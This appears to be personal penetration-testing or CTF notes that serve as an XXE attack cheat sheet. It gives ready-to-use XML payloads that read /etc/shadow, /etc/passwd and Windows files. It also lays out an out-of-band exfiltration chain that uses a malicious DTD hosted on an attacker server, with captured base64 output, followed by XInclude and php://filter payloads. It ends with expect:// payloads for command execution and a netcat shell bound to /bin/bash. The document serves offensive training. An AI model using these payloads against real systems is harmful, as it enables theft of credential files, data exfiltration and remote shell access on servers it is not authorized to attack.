# XXE
## Exploit Example
### read /etc/shadow
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/shadow"> ]>
### read a common/less privileged linux file
<?xml version=”1.0″ encoding=”ISO-8859-1″?> 
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM “file:///etc/passwd” >
]> 
<xml> 
<foo>&xxe;</foo> </xml>

### read a privileged file
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
<foo>&xxe;</foo>

### read common file in windows
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
<foo>&xxe;</foo>


### xml with fields to grab a file
The server is expecting certain fields in the XML file.  
https://infosecwriteups.com/devoops-an-xml-external-entity-xxe-hackthebox-walkthrough-fb5ba03aaaa2
`
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "file:////etc/passwd" >
]>
<note>
  <Author>Mitchell Moser</Author>
  <Subject>Gimme the Loot</Subject>
  <Content>&file;</Content>
</note>
`

### xml to connect to my IP and port
<?xml version = "1.0"?>
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "http://$MY_IP:$MY_PORT" >
]>
<foo>&xxe;</foo>
<order>
<quantity>test</quantity>
<item>Home Appliances</item>
<address>&file;</address>
<note></note>
</order>

##  Server to read files
1.  Make a file called `xxe.dtd` with the following contents
```
<!ENTITY % all "<!ENTITY &#x25; req SYSTEM 'http://10.10.14.14:8081/%file;'>">
```
1.  Start up a python server with the xxe.dtd file in its directory with the following
```
python3 -m http.server 8081
```
1.  Perform a request with the following xml
```
<?xml version = "1.0"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=C:/windows/win.ini">
<!ENTITY % dtd SYSTEM "http://$MY_IP:8081/xxe.dtd">

%dtd;
%all;
%req;
]>
```
1.  This should return something like the following in the log history for the python server
```
10.129.95.192 - - [16/Jan/2022 17:14:35] "GET /OyBmb3IgMTYtYml0IGFwcCBzdXBwb3J0DQpbZm9udHNdDQpbZXh0ZW5zaW9uc10NClttY2kgZXh0ZW5zaW9uc10NCltmaWxlc10NCltNYWlsXQ0KTUFQST0xDQpbUG9ydHNdDQpDT00xOj05NjAwLG4sOCwxDQo= HTTP/1.0" 404 -
```
1.  You can then run that in the base64 decode to see the output of that file
```
┌──(kali㉿kali)-[~]
└─$ echo "OyBmb3IgMTYtYml0IGFwcCBzdXBwb3J0DQpbZm9udHNdDQpbZXh0ZW5zaW9uc10NClttY2kgZXh0ZW5zaW9uc10NCltmaWxlc10NCltNYWlsXQ0KTUFQST0xDQpbUG9ydHNdDQpDT00xOj05NjAwLG4sOCwxDQo=" | base64 -d
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
[Ports]
COM1:=9600,n,8,1
                                                                                                                                                
┌──(kali㉿kali)-[~]
└─$  
```


##  XInclude Attacks
For when you cannot modify the DOCTYPE element use the XInclude to target
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## PHP Wrappers
### PHP filter with base64 encode to remote
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
]>
<foo>&xxe;</foo>

### PHP filter with base64 encoded local file
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>

### PHP expect RCE
Use `$IFS` in place of spaces
#### ls -lahrt
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://ls$IFS-lahrt">]>
<entry>
  <subject>&xxe;</subject>
  <category>Test</category>
  <text>Test</text>
</entry>

#### netcat -nvlp $MY_PORT -e '/bin/bash'
<!ENTITY xxe SYSTEM "expect://nc$IFS-nvlp$IFS'3334'$IFS-e$IFS'/bin/bash'">]>

